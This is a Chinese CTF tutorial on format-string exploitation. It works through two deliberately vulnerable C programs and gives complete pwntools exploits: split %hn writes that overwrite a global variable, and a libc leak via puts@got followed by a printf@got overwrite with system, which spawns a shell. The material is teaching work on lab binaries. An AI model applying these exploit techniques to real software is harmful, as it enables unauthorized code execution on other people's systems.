---
title: "02.1 格式化字符串经典例题"
description: "通过两道实测例题演示格式化字符串的偏移定位、大小序分段写入，以及泄露 libc 并改写 GOT 表获取 Shell 的完整流程。"
categories: [Pwn笔记, 第02章 格式化字符串]
tags: [format-string, got-hijack, pwntools]
---

本文结合两道经典题型，串起前一篇的偏移定位、大小序分段写、`%k$s` 任意读和 `fmtstr_payload` 改写 GOT 表。两道题均在 Ubuntu x86-64 下实测编译打通。

## 例题一：改写全局变量触发后门

### 题目源码与保护

```c
#include <stdio.h>
#include <unistd.h>

int magic = 0;

void win(void)
{
    puts("flag{fmt_str_write_success}");
}

void vuln(void)
{
    char buf[128];
    ssize_t n = read(0, buf, sizeof(buf) - 1);
    if (n <= 0)
    {
        return;
    }
    buf[n] = '\0';
    printf(buf);
    if (magic == 0x1337beef)
    {
        win();
    }
    else
    {
        printf("\nmagic = 0x%x\n", magic);
    }
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

编译为关闭 PIE 的 64 位程序：

```bash
gcc -no-pie -fno-stack-protector -Wno-format-security chal1.c -o chal1
```

拖进 IDA 按 `F5` 查看 `vuln()` 反编译伪代码：

```c
int vuln()
{
  ssize_t v0; // rax
  char buf[136]; // [rsp+0h] [rbp-90h] BYREF
  ssize_t v3; // [rsp+88h] [rbp-8h]

  v0 = read(fd: 0, buf, nbytes: 0x7Fu);
  v3 = v0;
  if ( v0 > 0 )
  {
    buf[v3] = 0;
    printf(format: buf);
    if ( magic == 322420463 )
      LODWORD(v0) = win();
    else
      LODWORD(v0) = printf(format: "\nmagic = 0x%x\n", magic);
  }
  return v0;
}
```

在伪代码中双击全局变量 `magic`，跳转到 `.bss` 段即可看到地址为 `0x40403c`（把光标停在 `322420463` 上按 `H` 键即可转为十六进制 `0x1337BEEF`；写脚本时也可直接用 `elf.sym["magic"]`）。同时看 `buf` 的注释 `[rsp+0h]`：它紧贴栈顶（偏移为 `0`），按公式心算就是 `6 + 0 / 8 = 6`。程序只有一次 `printf(buf)` 机会，需要一次性把 `magic` 改成 `0x1337beef`。

### 分析与偏移计算

1. **实测偏移 `k`**：输入 `AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p`，得到回显：

```text
AAAAAAAA.0x7ffc37187de0.0x7ffc37187de0.(nil).(nil).0x700698157380.0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70
```

从第一个 `.` 后数到第 6 项出现 `0x4141414141414141`，确认这题 `buf` 的起点为 `k = 6`。

2. **按数值从小到大拆分**：目标 `0x1337beef` 的低 2 字节（`0xbeef = 48879`）大于高 2 字节（`0x1337 = 4919`）。由于 `printf` 内部计数器只能累加不能倒退，把较小的数排在前面先写：

- 第 1 次写入高 2 字节（`magic + 2 = 0x40403e`）：用 `%4919c` 让计数器达到 `4919`，再用 `%hn` 写入 `0x1337`。
- 第 2 次写入低 2 字节（`magic = 0x40403c`）：差值为 `48879 - 4919 = 43960`，用 `%43960c` 把计数器推到 `48879`，再用 `%hn` 写入 `0xbeef`。

3. **对齐计算槽位**：格式控制前缀 `%4919c%10$hn%43960c%11$hn` 共 25 字节，补 7 个 `'A'` 凑到 32 字节（占满 `%6$` 到 `%9$` 共 4 个槽位），末尾接 `p64(magic + 2)` 和 `p64(magic)` 分别落在 `%10$` 和 `%11$`。

```text
buf[0..31]  (%6$ ~ %9$): "%4919c%10$hn%43960c%11$hnAAAAAAA"  (25 + 7 = 32 字节)
buf[32..39] (%10$):      p64(0x40403e)
buf[40..47] (%11$):      p64(0x40403c)
```

### 完整 exp

```python
from pwn import *
elf=ELF("./chal1")
context.binary=elf
io=process("./chal1")
magic=elf.sym["magic"]
payload=b"%4919c%10$hn%43960c%11$hn".ljust(32,b"A")+p64(magic+2)+p64(magic)
io.send(payload)
print(io.recvall().decode(errors="ignore"))
```

运行后程序输出大量空格并触发 `win()`，打印出 `flag{fmt_str_write_success}`。

---

## 例题二：泄露 libc 并改写 GOT 表拿 Shell

### 题目源码与保护

```c
#include <stdio.h>
#include <unistd.h>

void vuln(void)
{
    char buf[128];
    while (1)
    {
        ssize_t n = read(0, buf, sizeof(buf) - 1);
        if (n <= 0)
        {
            break;
        }
        buf[n] = '\0';
        printf(buf);
    }
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    puts("Welcome:");
    vuln();
    return 0;
}
```

编译为 Partial RELRO、关闭 PIE 的 64 位程序：

```bash
gcc -no-pie -Wl,-z,relro -Wno-format-security chal2.c -o chal2
```

拖进 IDA 按 `F5` 查看 `vuln()` 反编译伪代码：

```c
unsigned __int64 vuln()
{
  ssize_t v1; // [rsp+8h] [rbp-98h]
  char buf[136]; // [rsp+10h] [rbp-90h] BYREF
  unsigned __int64 v3; // [rsp+98h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  while ( 1 )
  {
    v1 = read(fd: 0, buf, nbytes: 0x7Fu);
    if ( v1 <= 0 )
      break;
    buf[v1] = 0;
    printf(format: buf);
  }
  return v3 - __readfsqword(0x28u);
}
```

注意看 IDA 伪代码里 `buf` 的栈偏移变成了 `[rsp+10h]`（前面 `0x10` 字节被局部变量 `v1` 和栈对齐占掉了），直接心算就是 `6 + 0x10 / 8 = 8`。因为是 Partial RELRO，GOT 表可写；`vuln()` 里有 `while (1)` 循环，支持多轮交互，但每次最多读入 127 字节（`0x7F`）。

### 分析与利用步骤

1. **验证偏移 `k`**：发 `AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p` 探测，回显如下：

```text
AAAAAAAA.0x7ffdea214910.0x7ffdea214910.(nil).0x8.0x7924a6156380.0xa.0x21.0x4141414141414141
```

`0x4141414141414141` 正好出现在第 8 个位置（`k = 8`），与 IDA 伪代码注释 `[rsp+10h]` 算出的结果完全一致。

2. **第 1 轮：泄露 `puts@got` 算 libc 基址**：在 IDA 的 `Imports` 窗口（或双击 `puts` 跳转到 `.got.plt`）可以确认 `puts@got` 的位置，脚本中直接用 `elf.got["puts"]` 读取。`main()` 开头已经调用过 `puts("Welcome:")`，`puts@got` 中已经填入了真实的 libc 地址。构造 `"%9$sEND_"`（刚好 8 字节占满 `%8$`），后接 `p64(elf.got["puts"])`（落入 `%9$`）。收到回显后按 `END_` 截断解包出 `puts` 地址，减去 libc 偏移得到 `libc_base` 和 `system`。

3. **第 2 轮：改写 `printf@got` 为 `system`**：使用 `fmtstr_payload(8, {printf_got: system}, write_size="short")`。这里需要留意长度限制：若使用默认的 `write_size="byte"`，8 字节地址会拆出 6\~8 段写指令，总长度容易超过 127 字节；改用 `"short"` 按 2 字节拆成 3 段后，payload 远小于上限且写完立即生效。

4. **第 3 轮：触发 `system("/bin/sh")`**：`printf@got` 被替换后，下一轮发送 `"/bin/sh\x00"`，循环里的 `printf(buf)` 实际上就变成了 `system("/bin/sh")`。

### 完整 exp

```python
from pwn import *
elf=ELF("./chal2")
context.binary=elf
libc=elf.libc
io=process("./chal2")
puts_got=elf.got["puts"]
printf_got=elf.got["printf"]
io.recvuntil(b"Welcome:\n")
io.sendline(b"AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p")
k=io.recvline().decode().split(".").index("0x4141414141414141")
leak_payload=f"%{k+1}$sEND_".ljust(8,"A").encode()+p64(puts_got)
io.send(leak_payload)
leak=u64(io.recvuntil(b"END_",drop=True).ljust(8,b"\x00"))
libc_base=leak-libc.sym["puts"]
system=libc_base+libc.sym["system"]
payload=fmtstr_payload(k,{printf_got:system},write_size="short")
io.send(payload)
sleep(0.2)
io.clean()
io.send(b"/bin/sh\x00")
io.interactive()
```

---

## 常见踩坑小结

- **不要硬编码 `k`**：同一套代码多一个局部变量或换一种编译选项，`k` 就可能从 `6` 变成 `8`；写进 exp 里动态 `index("0x4141414141414141")` 探测最稳妥。
- **留意缓冲区长度上限**：`fmtstr_payload` 默认按 1 字节（`'byte'`）拆分，遇到 `buf` 只有 64\~128 字节的题目容易被截断，换成 `write_size="short"` 通常能压进限制内。
- **改写后等待缓冲清空再发下一轮**：第 2 轮写入 `printf@got` 会打印大量填充空格，先 `sleep` 配合 `io.clean()` 清掉多余输出再发 `"/bin/sh\x00"`，能避免下一轮 `read` 和输入流粘连错位。
